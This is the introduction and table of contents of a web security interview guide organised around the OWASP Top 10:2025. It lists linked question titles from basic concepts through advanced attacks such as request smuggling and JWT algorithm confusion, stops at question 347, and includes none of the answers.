# Web Security (OWASP) Interview Questions and Answers

_Last updated: October 29, 2026_

450 web security interview questions with answers, split into three levels: 150 easy, 150 moderate and 150 advanced.

The answers follow the OWASP Top 10:2025 list (released in November 2025) and current OWASP projects like ASVS 5.0, the Cheat Sheet Series and the Web Security Testing Guide. Where the 2021 list is different, it is mentioned, since many teams and job descriptions still refer to it. Code examples use JavaScript and Node.js unless stated otherwise.

## Table of Contents

- [Easy Questions (1-150)](#easy-questions-1-150)
- [Moderate Questions (151-300)](#moderate-questions-151-300)
- [Advanced Questions (301-450)](#advanced-questions-301-450)

### Easy Questions (1-150)

- [1: What is OWASP?](#1-what-is-owasp)
- [2: What is the OWASP Top 10?](#2-what-is-the-owasp-top-10)
- [3: What are the categories in the OWASP Top 10:2025?](#3-what-are-the-categories-in-the-owasp-top-102025)
- [4: How often is the OWASP Top 10 updated?](#4-how-often-is-the-owasp-top-10-updated)
- [5: What changed between the OWASP Top 10 2021 and 2025?](#5-what-changed-between-the-owasp-top-10-2021-and-2025)
- [6: What is a vulnerability?](#6-what-is-a-vulnerability)
- [7: What is the difference between a vulnerability, a threat and a risk?](#7-what-is-the-difference-between-a-vulnerability-a-threat-and-a-risk)
- [8: What is an exploit?](#8-what-is-an-exploit)
- [9: What is the CIA triad?](#9-what-is-the-cia-triad)
- [10: What is the difference between authentication and authorization?](#10-what-is-the-difference-between-authentication-and-authorization)
- [11: What is Broken Access Control?](#11-what-is-broken-access-control)
- [12: What is IDOR?](#12-what-is-idor)
- [13: Why is hiding a button in the UI not enough for access control?](#13-why-is-hiding-a-button-in-the-ui-not-enough-for-access-control)
- [14: What is the principle of least privilege?](#14-what-is-the-principle-of-least-privilege)
- [15: What is "deny by default"?](#15-what-is-deny-by-default)
- [16: What is vertical and horizontal privilege escalation?](#16-what-is-vertical-and-horizontal-privilege-escalation)
- [17: What is Security Misconfiguration?](#17-what-is-security-misconfiguration)
- [18: Why should you turn off debug mode in production?](#18-why-should-you-turn-off-debug-mode-in-production)
- [19: What is Software Supply Chain Failures?](#19-what-is-software-supply-chain-failures)
- [20: What is a vulnerable dependency?](#20-what-is-a-vulnerable-dependency)
- [21: How do you check a Node.js project for vulnerable dependencies?](#21-how-do-you-check-a-nodejs-project-for-vulnerable-dependencies)
- [22: What is Cryptographic Failures?](#22-what-is-cryptographic-failures)
- [23: What is the difference between encoding, encryption and hashing?](#23-what-is-the-difference-between-encoding-encryption-and-hashing)
- [24: Is Base64 encryption?](#24-is-base64-encryption)
- [25: What is the difference between symmetric and asymmetric encryption?](#25-what-is-the-difference-between-symmetric-and-asymmetric-encryption)
- [26: Why should passwords be hashed and not encrypted?](#26-why-should-passwords-be-hashed-and-not-encrypted)
- [27: Which algorithms should you use to hash passwords?](#27-which-algorithms-should-you-use-to-hash-passwords)
- [28: What is a salt?](#28-what-is-a-salt)
- [29: What is a rainbow table?](#29-what-is-a-rainbow-table)
- [30: What is HTTPS?](#30-what-is-https)
- [31: What is TLS?](#31-what-is-tls)
- [32: What is Injection?](#32-what-is-injection)
- [33: What is SQL injection?](#33-what-is-sql-injection)
- [34: What is a parameterized query?](#34-what-is-a-parameterized-query)
- [35: What is Cross-Site Scripting (XSS)?](#35-what-is-cross-site-scripting-xss)
- [36: What are the main types of XSS?](#36-what-are-the-main-types-of-xss)
- [37: What is output encoding?](#37-what-is-output-encoding)
- [38: How do frameworks like React and Angular help against XSS?](#38-how-do-frameworks-like-react-and-angular-help-against-xss)
- [39: What is Insecure Design?](#39-what-is-insecure-design)
- [40: What is the difference between a design flaw and an implementation bug?](#40-what-is-the-difference-between-a-design-flaw-and-an-implementation-bug)
- [41: What is Authentication Failures?](#41-what-is-authentication-failures)
- [42: What is credential stuffing?](#42-what-is-credential-stuffing)
- [43: What is a brute force attack?](#43-what-is-a-brute-force-attack)
- [44: What is multi-factor authentication (MFA)?](#44-what-is-multi-factor-authentication-mfa)
- [45: What is a passkey?](#45-what-is-a-passkey)
- [46: What is a session?](#46-what-is-a-session)
- [47: What makes a good session ID?](#47-what-makes-a-good-session-id)
- [48: What is session fixation?](#48-what-is-session-fixation)
- [49: What is Software or Data Integrity Failures?](#49-what-is-software-or-data-integrity-failures)
- [50: What is Security Logging and Alerting Failures?](#50-what-is-security-logging-and-alerting-failures)
- [51: What is Mishandling of Exceptional Conditions?](#51-what-is-mishandling-of-exceptional-conditions)
- [52: What does "fail closed" mean?](#52-what-does-fail-closed-mean)
- [53: What is Server-Side Request Forgery (SSRF)?](#53-what-is-server-side-request-forgery-ssrf)
- [54: What is Cross-Site Request Forgery (CSRF)?](#54-what-is-cross-site-request-forgery-csrf)
- [55: What is a CSRF token?](#55-what-is-a-csrf-token)
- [56: What is the same-origin policy?](#56-what-is-the-same-origin-policy)
- [57: What is CORS?](#57-what-is-cors)
- [58: Does CORS protect your API from attackers?](#58-does-cors-protect-your-api-from-attackers)
- [59: What are cookies?](#59-what-are-cookies)
- [60: What does the HttpOnly cookie flag do?](#60-what-does-the-httponly-cookie-flag-do)
- [61: What does the Secure cookie flag do?](#61-what-does-the-secure-cookie-flag-do)
- [62: What does the SameSite cookie attribute do?](#62-what-does-the-samesite-cookie-attribute-do)
- [63: What is clickjacking?](#63-what-is-clickjacking)
- [64: What is Content Security Policy (CSP)?](#64-what-is-content-security-policy-csp)
- [65: What is HSTS?](#65-what-is-hsts)
- [66: What does the X-Content-Type-Options header do?](#66-what-does-the-x-content-type-options-header-do)
- [67: What is input validation?](#67-what-is-input-validation)
- [68: What is the difference between allowlist and denylist validation?](#68-what-is-the-difference-between-allowlist-and-denylist-validation)
- [69: Why is client-side validation not enough?](#69-why-is-client-side-validation-not-enough)
- [70: What is path traversal?](#70-what-is-path-traversal)
- [71: What is OS command injection?](#71-what-is-os-command-injection)
- [72: What is an open redirect?](#72-what-is-an-open-redirect)
- [73: What is XXE?](#73-what-is-xxe)
- [74: What is a denial of service (DoS) attack?](#74-what-is-a-denial-of-service-dos-attack)
- [75: What is rate limiting?](#75-what-is-rate-limiting)
- [76: What is defense in depth?](#76-what-is-defense-in-depth)
- [77: What is the attack surface?](#77-what-is-the-attack-surface)
- [78: What is threat modeling?](#78-what-is-threat-modeling)
- [79: What is STRIDE?](#79-what-is-stride)
- [80: What is OWASP ASVS?](#80-what-is-owasp-asvs)
- [81: What is the OWASP Web Security Testing Guide (WSTG)?](#81-what-is-the-owasp-web-security-testing-guide-wstg)
- [82: What is the OWASP Cheat Sheet Series?](#82-what-is-the-owasp-cheat-sheet-series)
- [83: What is ZAP?](#83-what-is-zap)
- [84: What is Burp Suite?](#84-what-is-burp-suite)
- [85: What is a CVE?](#85-what-is-a-cve)
- [86: What is a CWE?](#86-what-is-a-cwe)
- [87: What is CVSS?](#87-what-is-cvss)
- [88: What is penetration testing?](#88-what-is-penetration-testing)
- [89: What is the difference between SAST, DAST and SCA?](#89-what-is-the-difference-between-sast-dast-and-sca)
- [90: What is a security header?](#90-what-is-a-security-header)
- [91: What is Helmet in Express?](#91-what-is-helmet-in-express)
- [92: Why should you remove the X-Powered-By header?](#92-why-should-you-remove-the-x-powered-by-header)
- [93: What is sensitive data?](#93-what-is-sensitive-data)
- [94: What is a secret in the context of application security?](#94-what-is-a-secret-in-the-context-of-application-security)
- [95: What should you do if a secret is committed to Git?](#95-what-should-you-do-if-a-secret-is-committed-to-git)
- [96: What is a JWT?](#96-what-is-a-jwt)
- [97: Can you trust the data in a JWT payload?](#97-can-you-trust-the-data-in-a-jwt-payload)
- [98: What is OAuth 2.0?](#98-what-is-oauth-20)
- [99: What is OpenID Connect (OIDC)?](#99-what-is-openid-connect-oidc)
- [100: What is the difference between an access token and a refresh token?](#100-what-is-the-difference-between-an-access-token-and-a-refresh-token)
- [101: Where should you store tokens in a browser app?](#101-where-should-you-store-tokens-in-a-browser-app)
- [102: What is the difference between stateful and stateless authentication?](#102-what-is-the-difference-between-stateful-and-stateless-authentication)
- [103: What happens on logout in a secure app?](#103-what-happens-on-logout-in-a-secure-app)
- [104: What is session timeout?](#104-what-is-session-timeout)
- [105: What is a password policy?](#105-what-is-a-password-policy)
- [106: Why are forced periodic password changes discouraged now?](#106-why-are-forced-periodic-password-changes-discouraged-now)
- [107: What is phishing?](#107-what-is-phishing)
- [108: What is social engineering?](#108-what-is-social-engineering)
- [109: What is user enumeration?](#109-what-is-user-enumeration)
- [110: What is a security misconfiguration in the cloud?](#110-what-is-a-security-misconfiguration-in-the-cloud)
- [111: What is the difference between a public and private S3 bucket?](#111-what-is-the-difference-between-a-public-and-private-s3-bucket)
- [112: What is a directory listing vulnerability?](#112-what-is-a-directory-listing-vulnerability)
- [113: What are default credentials?](#113-what-are-default-credentials)
- [114: What is a web application firewall (WAF)?](#114-what-is-a-web-application-firewall-waf)
- [115: What is the OWASP Core Rule Set?](#115-what-is-the-owasp-core-rule-set)
- [116: What is remote code execution (RCE)?](#116-what-is-remote-code-execution-rce)
- [117: What is a file upload vulnerability?](#117-what-is-a-file-upload-vulnerability)
- [118: What is sensitive data exposure in URLs?](#118-what-is-sensitive-data-exposure-in-urls)
- [119: What is the Referrer-Policy header?](#119-what-is-the-referrer-policy-header)
- [120: What is the Permissions-Policy header?](#120-what-is-the-permissions-policy-header)
- [121: What is Subresource Integrity (SRI)?](#121-what-is-subresource-integrity-sri)
- [122: What is a man-in-the-middle (MITM) attack?](#122-what-is-a-man-in-the-middle-mitm-attack)
- [123: What is a digital certificate?](#123-what-is-a-digital-certificate)
- [124: What is a digital signature?](#124-what-is-a-digital-signature)
- [125: What is HMAC?](#125-what-is-hmac)
- [126: Why should you not use Math.random() for security?](#126-why-should-you-not-use-mathrandom-for-security)
- [127: What is a security bug bounty program?](#127-what-is-a-security-bug-bounty-program)
- [128: What is a security.txt file?](#128-what-is-a-securitytxt-file)
- [129: What is responsible disclosure?](#129-what-is-responsible-disclosure)
- [130: What is a zero-day vulnerability?](#130-what-is-a-zero-day-vulnerability)
- [131: What is the shift-left approach to security?](#131-what-is-the-shift-left-approach-to-security)
- [132: What is DevSecOps?](#132-what-is-devsecops)
- [133: What is a security champion?](#133-what-is-a-security-champion)
- [134: What is OWASP SAMM?](#134-what-is-owasp-samm)
- [135: What is OWASP Juice Shop?](#135-what-is-owasp-juice-shop)
- [136: What is the OWASP API Security Top 10?](#136-what-is-the-owasp-api-security-top-10)
- [137: What is BOLA?](#137-what-is-bola)
- [138: What is the OWASP Top 10 for LLM Applications?](#138-what-is-the-owasp-top-10-for-llm-applications)
- [139: What is prompt injection?](#139-what-is-prompt-injection)
- [140: What is a security incident?](#140-what-is-a-security-incident)
- [141: What is an audit log?](#141-what-is-an-audit-log)
- [142: What should not be written to logs?](#142-what-should-not-be-written-to-logs)
- [143: What is log injection?](#143-what-is-log-injection)
- [144: What is the difference between a vulnerability scan and a penetration test?](#144-what-is-the-difference-between-a-vulnerability-scan-and-a-penetration-test)
- [145: What is a false positive in security scanning?](#145-what-is-a-false-positive-in-security-scanning)
- [146: What is security through obscurity?](#146-what-is-security-through-obscurity)
- [147: What is the zero trust model?](#147-what-is-the-zero-trust-model)
- [148: What is a CAPTCHA and when should you use it?](#148-what-is-a-captcha-and-when-should-you-use-it)
- [149: What is data minimization?](#149-what-is-data-minimization)
- [150: What are the most important security habits for a web developer?](#150-what-are-the-most-important-security-habits-for-a-web-developer)

### Moderate Questions (151-300)

- [151: How do you prevent IDOR in an Express and Prisma API?](#151-how-do-you-prevent-idor-in-an-express-and-prisma-api)
- [152: How do you implement role-based access control (RBAC) in Express?](#152-how-do-you-implement-role-based-access-control-rbac-in-express)
- [153: What is the difference between RBAC, ABAC and ReBAC?](#153-what-is-the-difference-between-rbac-abac-and-rebac)
- [154: What is mass assignment?](#154-what-is-mass-assignment)
- [155: How do you avoid leaking extra fields in API responses?](#155-how-do-you-avoid-leaking-extra-fields-in-api-responses)
- [156: How do you validate request input with Zod in Express?](#156-how-do-you-validate-request-input-with-zod-in-express)
- [157: How do you hash passwords with Argon2 in Node.js?](#157-how-do-you-hash-passwords-with-argon2-in-nodejs)
- [158: How do you hash passwords with bcrypt and what are its limits?](#158-how-do-you-hash-passwords-with-bcrypt-and-what-are-its-limits)
- [159: What is a pepper and how is it different from a salt?](#159-what-is-a-pepper-and-how-is-it-different-from-a-salt)
- [160: How do you upgrade old password hashes without forcing a reset?](#160-how-do-you-upgrade-old-password-hashes-without-forcing-a-reset)
- [161: How do you prevent SQL injection when the table or column name comes from the user?](#161-how-do-you-prevent-sql-injection-when-the-table-or-column-name-comes-from-the-user)
- [162: Can an ORM still be vulnerable to SQL injection?](#162-can-an-orm-still-be-vulnerable-to-sql-injection)
- [163: What is NoSQL injection in MongoDB?](#163-what-is-nosql-injection-in-mongodb)
- [164: Is the $where operator in MongoDB dangerous?](#164-is-the-where-operator-in-mongodb-dangerous)
- [165: How do you safely run a system command with user input in Node.js?](#165-how-do-you-safely-run-a-system-command-with-user-input-in-nodejs)
- [166: How do you prevent path traversal in Node.js?](#166-how-do-you-prevent-path-traversal-in-nodejs)
- [167: How do you safely render user HTML in React?](#167-how-do-you-safely-render-user-html-in-react)
- [168: Can XSS happen in React even without dangerouslySetInnerHTML?](#168-can-xss-happen-in-react-even-without-dangerouslysetinnerhtml)
- [169: How does Angular protect against XSS?](#169-how-does-angular-protect-against-xss)
- [170: What are common DOM-based XSS sinks?](#170-what-are-common-dom-based-xss-sinks)
- [171: How do you set up a strict CSP with nonces?](#171-how-do-you-set-up-a-strict-csp-with-nonces)
- [172: What is the difference between a nonce-based and an allowlist-based CSP?](#172-what-is-the-difference-between-a-nonce-based-and-an-allowlist-based-csp)
- [173: How do you roll out CSP without breaking the site?](#173-how-do-you-roll-out-csp-without-breaking-the-site)
- [174: Why does CSP block inline event handlers and how do you fix it?](#174-why-does-csp-block-inline-event-handlers-and-how-do-you-fix-it)
- [175: How do you implement CSRF protection in a traditional server-rendered app?](#175-how-do-you-implement-csrf-protection-in-a-traditional-server-rendered-app)
- [176: What is the double-submit cookie pattern?](#176-what-is-the-double-submit-cookie-pattern)
- [177: How can you use Fetch Metadata headers to stop CSRF?](#177-how-can-you-use-fetch-metadata-headers-to-stop-csrf)
- [178: Do APIs that use Bearer tokens in headers need CSRF protection?](#178-do-apis-that-use-bearer-tokens-in-headers-need-csrf-protection)
- [179: How do you configure CORS safely in Express?](#179-how-do-you-configure-cors-safely-in-express)
- [180: Why can't you use Access-Control-Allow-Origin: * with credentials?](#180-why-cant-you-use-access-control-allow-origin--with-credentials)
- [181: What is a CORS preflight request?](#181-what-is-a-cors-preflight-request)
- [182: How do you set up secure session cookies with express-session?](#182-how-do-you-set-up-secure-session-cookies-with-express-session)
- [183: What are the __Host- and __Secure- cookie prefixes?](#183-what-are-the-__host--and-__secure--cookie-prefixes)
- [184: How do you regenerate the session ID after login in Express?](#184-how-do-you-regenerate-the-session-id-after-login-in-express)
- [185: How do you protect a login endpoint from brute force?](#185-how-do-you-protect-a-login-endpoint-from-brute-force)
- [186: How do you add rate limiting in Express?](#186-how-do-you-add-rate-limiting-in-express)
- [187: How do you build a secure password reset flow?](#187-how-do-you-build-a-secure-password-reset-flow)
- [188: Why should you store a hash of the reset token instead of the token itself?](#188-why-should-you-store-a-hash-of-the-reset-token-instead-of-the-token-itself)
- [189: How do you check passwords against breached password lists?](#189-how-do-you-check-passwords-against-breached-password-lists)
- [190: How do you implement TOTP-based MFA?](#190-how-do-you-implement-totp-based-mfa)
- [191: Why is SMS a weak second factor?](#191-why-is-sms-a-weak-second-factor)
- [192: What is MFA fatigue and how do you prevent it?](#192-what-is-mfa-fatigue-and-how-do-you-prevent-it)
- [193: How do passkeys prevent phishing?](#193-how-do-passkeys-prevent-phishing)
- [194: What is the JWT "alg: none" attack?](#194-what-is-the-jwt-alg-none-attack)
- [195: What should you check when verifying a JWT?](#195-what-should-you-check-when-verifying-a-jwt)
- [196: Why should you not put JWTs in localStorage?](#196-why-should-you-not-put-jwts-in-localstorage)
- [197: How do you revoke JWTs before they expire?](#197-how-do-you-revoke-jwts-before-they-expire)
- [198: What is refresh token rotation?](#198-what-is-refresh-token-rotation)
- [199: What is PKCE and why is it used?](#199-what-is-pkce-and-why-is-it-used)
- [200: Which OAuth flows should you not use anymore?](#200-which-oauth-flows-should-you-not-use-anymore)
- [201: What is the state parameter in OAuth for?](#201-what-is-the-state-parameter-in-oauth-for)
- [202: What is the nonce parameter in OpenID Connect?](#202-what-is-the-nonce-parameter-in-openid-connect)
- [203: What is the backend-for-frontend (BFF) pattern for SPAs?](#203-what-is-the-backend-for-frontend-bff-pattern-for-spas)
- [204: How do you secure file uploads in Node.js?](#204-how-do-you-secure-file-uploads-in-nodejs)
- [205: Why are SVG uploads risky?](#205-why-are-svg-uploads-risky)
- [206: Why serve user uploads from a separate domain?](#206-why-serve-user-uploads-from-a-separate-domain)
- [207: What is ReDoS?](#207-what-is-redos)
- [208: What is prototype pollution in JavaScript?](#208-what-is-prototype-pollution-in-javascript)
- [209: How do you prevent prototype pollution?](#209-how-do-you-prevent-prototype-pollution)
- [210: What is insecure deserialization?](#210-what-is-insecure-deserialization)
- [211: What is server-side template injection (SSTI)?](#211-what-is-server-side-template-injection-ssti)
- [212: What is CRLF injection or HTTP response splitting?](#212-what-is-crlf-injection-or-http-response-splitting)
- [213: What is host header injection?](#213-what-is-host-header-injection)
- [214: How do you prevent open redirects?](#214-how-do-you-prevent-open-redirects)
- [215: How do you prevent SSRF in a "fetch this URL" feature?](#215-how-do-you-prevent-ssrf-in-a-fetch-this-url-feature)
- [216: Why is blocking "localhost" in the URL not enough to stop SSRF?](#216-why-is-blocking-localhost-in-the-url-not-enough-to-stop-ssrf)
- [217: What is the cloud metadata service and why does SSRF target it?](#217-what-is-the-cloud-metadata-service-and-why-does-ssrf-target-it)
- [218: What is IMDSv2 on AWS?](#218-what-is-imdsv2-on-aws)
- [219: How do you verify a webhook signature?](#219-how-do-you-verify-a-webhook-signature)
- [220: How do you prevent webhook replay attacks?](#220-how-do-you-prevent-webhook-replay-attacks)
- [221: What is a timing attack?](#221-what-is-a-timing-attack)
- [222: How do you encrypt data with AES-GCM in Node.js?](#222-how-do-you-encrypt-data-with-aes-gcm-in-nodejs)
- [223: Why is AES in ECB mode insecure?](#223-why-is-aes-in-ecb-mode-insecure)
- [224: What is authenticated encryption?](#224-what-is-authenticated-encryption)
- [225: What is the difference between encryption in transit and encryption at rest?](#225-what-is-the-difference-between-encryption-in-transit-and-encryption-at-rest)
- [226: Which TLS settings should you use on a web server?](#226-which-tls-settings-should-you-use-on-a-web-server)
- [227: What is forward secrecy?](#227-what-is-forward-secrecy)
- [228: What is the HSTS preload list?](#228-what-is-the-hsts-preload-list)
- [229: What is mixed content?](#229-what-is-mixed-content)
- [230: How should secrets be managed in a Node.js app?](#230-how-should-secrets-be-managed-in-a-nodejs-app)
- [231: How do you scan for secrets in Git repositories?](#231-how-do-you-scan-for-secrets-in-git-repositories)
- [232: What is the difference between npm install and npm ci?](#232-what-is-the-difference-between-npm-install-and-npm-ci)
- [233: Why should you commit lock files?](#233-why-should-you-commit-lock-files)
- [234: What is typosquatting in package registries?](#234-what-is-typosquatting-in-package-registries)
- [235: What is dependency confusion?](#235-what-is-dependency-confusion)
- [236: Why are npm install scripts a risk?](#236-why-are-npm-install-scripts-a-risk)
- [237: How do you set up Dependabot for security updates?](#237-how-do-you-set-up-dependabot-for-security-updates)
- [238: What is an SBOM?](#238-what-is-an-sbom)
- [239: What is OWASP Dependency-Check?](#239-what-is-owasp-dependency-check)
- [240: How do you add SAST to a CI pipeline?](#240-how-do-you-add-sast-to-a-ci-pipeline)
- [241: How do you run a ZAP baseline scan in CI?](#241-how-do-you-run-a-zap-baseline-scan-in-ci)
- [242: What is container image scanning?](#242-what-is-container-image-scanning)
- [243: How do you make a Docker image more secure?](#243-how-do-you-make-a-docker-image-more-secure)
- [244: What should a good error response look like from a security point of view?](#244-what-should-a-good-error-response-look-like-from-a-security-point-of-view)
- [245: How do you handle unhandled promise rejections and uncaught exceptions in Node.js?](#245-how-do-you-handle-unhandled-promise-rejections-and-uncaught-exceptions-in-nodejs)
- [246: What is a fail-open bug? Give an example.](#246-what-is-a-fail-open-bug-give-an-example)
- [247: Which security events should an app log?](#247-which-security-events-should-an-app-log)
- [248: How do you avoid logging sensitive data with a logger like pino?](#248-how-do-you-avoid-logging-sensitive-data-with-a-logger-like-pino)
- [249: What kind of alerts should a web app have for security?](#249-what-kind-of-alerts-should-a-web-app-have-for-security)
- [250: What is a SIEM?](#250-what-is-a-siem)
- [251: How do you secure a GraphQL API?](#251-how-do-you-secure-a-graphql-api)
- [252: What is a GraphQL batching attack?](#252-what-is-a-graphql-batching-attack)
- [253: How do you secure a REST API in general?](#253-how-do-you-secure-a-rest-api-in-general)
- [254: What is Broken Function Level Authorization?](#254-what-is-broken-function-level-authorization)
- [255: What is Improper Inventory Management in APIs?](#255-what-is-improper-inventory-management-in-apis)
- [256: What is Unsafe Consumption of APIs?](#256-what-is-unsafe-consumption-of-apis)
- [257: How do you protect against business logic abuse like ticket scalping or coupon abuse?](#257-how-do-you-protect-against-business-logic-abuse-like-ticket-scalping-or-coupon-abuse)
- [258: How do you set up security headers in Nginx?](#258-how-do-you-set-up-security-headers-in-nginx)
- [259: What are COOP, COEP and CORP?](#259-what-are-coop-coep-and-corp)
- [260: What is reverse tabnabbing?](#260-what-is-reverse-tabnabbing)
- [261: How do you safely use postMessage?](#261-how-do-you-safely-use-postmessage)
- [262: How do you secure WebSockets?](#262-how-do-you-secure-websockets)
- [263: What is cross-site WebSocket hijacking (CSWSH)?](#263-what-is-cross-site-websocket-hijacking-cswsh)
- [264: How do you make XML parsing safe from XXE in Node.js?](#264-how-do-you-make-xml-parsing-safe-from-xxe-in-nodejs)
- [265: What is a zip slip vulnerability?](#265-what-is-a-zip-slip-vulnerability)
- [266: What is a zip bomb?](#266-what-is-a-zip-bomb)
- [267: How do you protect against XSS in JSON responses that get embedded in HTML?](#267-how-do-you-protect-against-xss-in-json-responses-that-get-embedded-in-html)
- [268: Why should API responses use the right Content-Type?](#268-why-should-api-responses-use-the-right-content-type)
- [269: What is Trusted Types?](#269-what-is-trusted-types)
- [270: What is the difference between sanitization and escaping?](#270-what-is-the-difference-between-sanitization-and-escaping)
- [271: Why is writing your own HTML sanitizer a bad idea?](#271-why-is-writing-your-own-html-sanitizer-a-bad-idea)
- [272: What is the HTML Sanitizer API?](#272-what-is-the-html-sanitizer-api)
- [273: How do you prevent CSV injection?](#273-how-do-you-prevent-csv-injection)
- [274: What is HTTP parameter pollution?](#274-what-is-http-parameter-pollution)
- [275: How should you handle "remember me" functionality securely?](#275-how-should-you-handle-remember-me-functionality-securely)
- [276: What is step-up authentication?](#276-what-is-step-up-authentication)
- [277: How do you secure an account email change?](#277-how-do-you-secure-an-account-email-change)
- [278: How do you protect APIs that use API keys?](#278-how-do-you-protect-apis-that-use-api-keys)
- [279: What is the difference between authentication and API keys?](#279-what-is-the-difference-between-authentication-and-api-keys)
- [280: How do you secure environment variables in CI/CD?](#280-how-do-you-secure-environment-variables-in-cicd)
- [281: What is OIDC federation in GitHub Actions?](#281-what-is-oidc-federation-in-github-actions)
- [282: Why should you pin GitHub Actions to a commit SHA?](#282-why-should-you-pin-github-actions-to-a-commit-sha)
- [283: What is the risk of pull_request_target in GitHub Actions?](#283-what-is-the-risk-of-pull_request_target-in-github-actions)
- [284: What is script injection in GitHub Actions?](#284-what-is-script-injection-in-github-actions)
- [285: How do you limit the GITHUB_TOKEN permissions?](#285-how-do-you-limit-the-github_token-permissions)
- [286: How do you validate URLs given by users?](#286-how-do-you-validate-urls-given-by-users)
- [287: How do you secure cookies when using subdomains?](#287-how-do-you-secure-cookies-when-using-subdomains)
- [288: What is subdomain takeover?](#288-what-is-subdomain-takeover)
- [289: How do you secure an admin panel?](#289-how-do-you-secure-an-admin-panel)
- [290: What is the difference between 401 and 403 responses?](#290-what-is-the-difference-between-401-and-403-responses)
- [291: How do you handle CORS for public APIs that do not use cookies?](#291-how-do-you-handle-cors-for-public-apis-that-do-not-use-cookies)
- [292: What is the risk of using third-party scripts like analytics or chat widgets?](#292-what-is-the-risk-of-using-third-party-scripts-like-analytics-or-chat-widgets)
- [293: What is Magecart?](#293-what-is-magecart)
- [294: How do you secure a Node.js app's runtime?](#294-how-do-you-secure-a-nodejs-apps-runtime)
- [295: How do you limit request body size in Express?](#295-how-do-you-limit-request-body-size-in-express)
- [296: What is a slow loris attack?](#296-what-is-a-slow-loris-attack)
- [297: How do you do security code reviews?](#297-how-do-you-do-security-code-reviews)
- [298: What is a threat model diagram?](#298-what-is-a-threat-model-diagram)
- [299: What is OWASP Threat Dragon?](#299-what-is-owasp-threat-dragon)
- [300: How do you write security requirements for a new feature?](#300-how-do-you-write-security-requirements-for-a-new-feature)

### Advanced Questions (301-450)

- [301: Why did OWASP merge SSRF into Broken Access Control in 2025?](#301-why-did-owasp-merge-ssrf-into-broken-access-control-in-2025)
- [302: Why did "Vulnerable and Outdated Components" become "Software Supply Chain Failures"?](#302-why-did-vulnerable-and-outdated-components-become-software-supply-chain-failures)
- [303: What does A10:2025 Mishandling of Exceptional Conditions add that was not covered before?](#303-what-does-a102025-mishandling-of-exceptional-conditions-add-that-was-not-covered-before)
- [304: How is the OWASP Top 10 data actually collected and ranked?](#304-how-is-the-owasp-top-10-data-actually-collected-and-ranked)
- [305: What is the difference between using the Top 10 and using ASVS in a project?](#305-what-is-the-difference-between-using-the-top-10-and-using-asvs-in-a-project)
- [306: What changed in ASVS 5.0?](#306-what-changed-in-asvs-50)
- [307: How would you design authorization for a multi-tenant SaaS app?](#307-how-would-you-design-authorization-for-a-multi-tenant-saas-app)
- [308: How does PostgreSQL row-level security help with tenant isolation?](#308-how-does-postgresql-row-level-security-help-with-tenant-isolation)
- [309: Where should authorization logic live in a microservices architecture?](#309-where-should-authorization-logic-live-in-a-microservices-architecture)
- [310: How do you pass user identity between microservices safely?](#310-how-do-you-pass-user-identity-between-microservices-safely)
- [311: What is mTLS and when would you use it?](#311-what-is-mtls-and-when-would-you-use-it)
- [312: What is the confused deputy problem?](#312-what-is-the-confused-deputy-problem)
- [313: Walk through the JWT algorithm confusion attack (RS256 to HS256).](#313-walk-through-the-jwt-algorithm-confusion-attack-rs256-to-hs256)
- [314: What are the risks of the JWT kid and jku headers?](#314-what-are-the-risks-of-the-jwt-kid-and-jku-headers)
- [315: How do you design key rotation for JWT signing keys?](#315-how-do-you-design-key-rotation-for-jwt-signing-keys)
- [316: What is DPoP and what problem does it solve?](#316-what-is-dpop-and-what-problem-does-it-solve)
- [317: What are common OAuth redirect_uri attacks?](#317-what-are-common-oauth-redirect_uri-attacks)
- [318: What is a mix-up attack in OAuth?](#318-what-is-a-mix-up-attack-in-oauth)
- [319: How do you secure an SPA that talks to several APIs with OAuth?](#319-how-do-you-secure-an-spa-that-talks-to-several-apis-with-oauth)
- [320: How would you detect and respond to a session hijacking in progress?](#320-how-would-you-detect-and-respond-to-a-session-hijacking-in-progress)
- [321: What is mutation XSS (mXSS)?](#321-what-is-mutation-xss-mxss)
- [322: What is DOM clobbering?](#322-what-is-dom-clobbering)
- [323: How can a CSP be bypassed?](#323-how-can-a-csp-be-bypassed)
- [324: What is dangling markup injection?](#324-what-is-dangling-markup-injection)
- [325: What are XS-Leaks?](#325-what-are-xs-leaks)
- [326: How do Fetch Metadata resource isolation policies work?](#326-how-do-fetch-metadata-resource-isolation-policies-work)
- [327: What is HTTP request smuggling?](#327-what-is-http-request-smuggling)
- [328: How do you defend against request smuggling?](#328-how-do-you-defend-against-request-smuggling)
- [329: What is web cache poisoning?](#329-what-is-web-cache-poisoning)
- [330: What is web cache deception?](#330-what-is-web-cache-deception)
- [331: What is DNS rebinding and how does it affect SSRF filters and local services?](#331-what-is-dns-rebinding-and-how-does-it-affect-ssrf-filters-and-local-services)
- [332: How do you build an SSRF-safe HTTP client in Node.js?](#332-how-do-you-build-an-ssrf-safe-http-client-in-nodejs)
- [333: How do race conditions lead to security bugs?](#333-how-do-race-conditions-lead-to-security-bugs)
- [334: What is TOCTOU?](#334-what-is-toctou)
- [335: How do you find business logic vulnerabilities?](#335-how-do-you-find-business-logic-vulnerabilities)
- [336: A checkout API accepts the price from the client. What would you change?](#336-a-checkout-api-accepts-the-price-from-the-client-what-would-you-change)
- [337: How do you design idempotency for payment APIs?](#337-how-do-you-design-idempotency-for-payment-apis)
- [338: How would you threat model a password reset feature?](#338-how-would-you-threat-model-a-password-reset-feature)
- [339: How do you secure account recovery when the user has lost their MFA device?](#339-how-do-you-secure-account-recovery-when-the-user-has-lost-their-mfa-device)
- [340: What is session riding through a browser extension, and can a web app defend against it?](#340-what-is-session-riding-through-a-browser-extension-and-can-a-web-app-defend-against-it)
- [341: How would you secure a Next.js app against common OWASP risks?](#341-how-would-you-secure-a-nextjs-app-against-common-owasp-risks)
- [342: Why are Server Actions and similar RPC features a common source of access control bugs?](#342-why-are-server-actions-and-similar-rpc-features-a-common-source-of-access-control-bugs)
- [343: What were the React Server Components vulnerabilities in late 2025, and what lessons do they teach?](#343-what-were-the-react-server-components-vulnerabilities-in-late-2025-and-what-lessons-do-they-teach)
- [344: How do you handle a critical vulnerability in a framework you use, like Log4Shell or React2Shell?](#344-how-do-you-handle-a-critical-vulnerability-in-a-framework-you-use-like-log4shell-or-react2shell)
- [345: How did the 2025 npm worms (like Shai-Hulud) work, and how do you defend against them?](#345-how-did-the-2025-npm-worms-like-shai-hulud-work-and-how-do-you-defend-against-them)
- [346: What is npm trusted publishing and package provenance?](#346-what-is-npm-trusted-publishing-and-package-provenance)
- [347: What is SLSA?](#347-what-is-slsa)
